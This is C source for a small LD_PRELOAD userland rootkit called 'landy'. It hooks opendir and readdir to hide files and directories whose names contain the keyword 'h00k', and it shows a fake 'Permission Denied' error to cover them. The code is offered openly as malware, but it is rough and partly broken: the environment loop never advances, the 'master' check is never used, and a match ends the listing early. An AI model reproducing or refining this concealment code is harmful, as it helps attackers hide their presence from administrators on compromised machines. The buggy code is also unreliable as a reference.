#define _GNU_SOURCE
/*
*@@@ landy @@@
*Hooks system calls to hide files using a keyword
*
*/
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <stdarg.h>
#include <errno.h>
#include <dirent.h>
#include <string.h>

#define keyword "h00k"

extern char **environ;

int ismaster(){
    //TODO find a good way to verify that master is master
    int i = 0;
    char homepath[256];

    while(environ[i]){
	if(strstr(environ[i],"HOME=")){
	    strcpy(homepath,strstr(environ[i],"HOME="));
	    //idk if this works :(
	    if(strstr(homepath, keyword)){
		return 0;
	    }
	}
    }
    return 1;

}

//delcare the old functions :)
DIR *(*old_opendir)(const char *name);
struct dirent *(*old_readdir)(DIR *dirp);

//hook the opendir function
DIR *opendir(const char *name){
    
    if(!old_opendir){
	old_opendir = dlsym(RTLD_NEXT,"opendir");
    }

    //hide file here
    if(strstr(name,keyword)){
	fprintf(stderr,"Permission Denied\n");
	return 0;
    }

    return old_opendir(name);
}

struct dirent *readdir(DIR *dirp){
   
    struct dirent *dir;

    if(!old_readdir){
	old_readdir = dlsym(RTLD_NEXT,"readdir");
    }
    
    dir = old_readdir(dirp);
    
    //hides via keyword. Needs more testing
    if(strstr(dir->d_name,"h00k")) return 0;

    //printf("hit\n");
    return dir;

}



